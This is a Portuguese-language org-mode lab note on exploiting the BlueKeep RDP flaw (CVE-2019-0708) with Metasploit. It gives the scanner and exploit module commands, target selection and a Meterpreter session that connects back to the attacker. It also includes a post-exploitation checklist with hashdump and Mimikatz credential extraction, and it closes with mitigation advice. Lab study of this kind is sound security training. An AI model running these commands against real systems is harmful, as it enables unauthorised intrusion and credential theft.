#+TITLE: Exploração da Vulnerabilidade BlueKeep (CVE-2019-0708)
#+AUTHOR: Gabriel
#+DESCRIPTION: Documentação técnica sobre a exploração do RDP via Metasploit Framework.
#+LANGUAGE: pt-br
#+OPTIONS: toc:2

* Introdução
O **BlueKeep** (CVE-2019-0708) é uma vulnerabilidade crítica de execução remota de código (RCE) no protocolo RDP (Remote Desktop Protocol) da Microsoft. Ela é considerada "wormable", o que significa que um malware poderia se propagar entre máquinas vulneráveis sem interação do usuário.

- **Impacto:** Execução de código em nível de SYSTEM.
- **Sistemas Afetados:** Windows 7, Windows Server 2008, e Windows Server 2008 R2.

* Preparação do Ambiente
Para realizar este laboratório, você precisará de:
1. Uma máquina atacante com **Metasploit Framework** (Linux/Zsh).
2. Uma máquina alvo (Windows 7 SP1 sem as atualizações de maio de 2019).
3. Conetividade de rede entre ambas (porta 3389 aberta).

* Fase 1: Reconhecimento e Scanner
Antes de tentar o exploit, usamos um módulo auxiliar para confirmar se o alvo está vulnerável e se não causará um BSOD (Blue Screen of Death) imediato.

#+BEGIN_SRC zsh
msfconsole -q
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <IP_DO_ALVO>
run
#+END_SRC

**Resultados esperados:**
- ~The target is vulnerable.~ -> Prossiga para a exploração.
- ~The target service is running, but could not be validated.~ -> Verifique as configurações de RDP.

* Fase 2: Configuração do Exploit
O exploit do BlueKeep no Metasploit requer atenção especial ao "Target", pois o gerenciamento de memória no kernel do Windows varia conforme o ambiente (VirtualBox, VMware, Bare Metal).

#+BEGIN_SRC zsh
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <IP_DO_ALVO>
set LHOST <SEU_IP_VPN_OU_LOCAL>
#+END_SRC

**Seleção do Target:**
É crucial definir o ambiente correto para evitar o crash da máquina.
#+BEGIN_SRC zsh
show targets
set TARGET <ID_CORRESPONDENTE> # Ex: 2 para VirtualBox
#+END_SRC

* Fase 3: Execução
Uma vez configurado, executamos o comando:

#+BEGIN_SRC zsh
exploit
#+END_SRC

Se bem-sucedido, você receberá uma sessão de **Meterpreter**.

* Pós-Exploração (Checklist)
Após conseguir o acesso, realize os seguintes comandos básicos no Meterpreter:

- [ ] ~getuid~: Verificar se está como `NT AUTHORITY\SYSTEM`.
- [ ] ~sysinfo~: Confirmar detalhes do sistema operacional.
- [ ] ~hashdump~: Extrair hashes de senhas locais.
- [ ] ~load kiwi~: Carregar o Mimikatz para extração de credenciais em memória.

* Mitigação e Defesa
Como um futuro auditor ISO 27001 ou especialista em Red Team, as recomendações de remediação são fundamentais:

1. **Patching:** Aplicar as atualizações de segurança de maio de 2019 da Microsoft.
2. **NLA:** Habilitar o *Network Level Authentication* (NLA). Isso impede que atacantes não autenticados alcancem o código vulnerável.
3. **Firewall:** Bloquear a porta TCP 3389 para a internet e restringir o acesso apenas via VPN corporativa.
4. **Desativação:** Desativar o serviço de Remote Desktop se não for estritamente necessário.

---
# Notas de Estudo:
# - Cuidado: Este exploit interage com o kernel. Há um risco real de causar BSOD no alvo.
# - Dica de Emacs: Use 'C-c C-c' dentro dos blocos de código se tiver o ob-shell configurado.
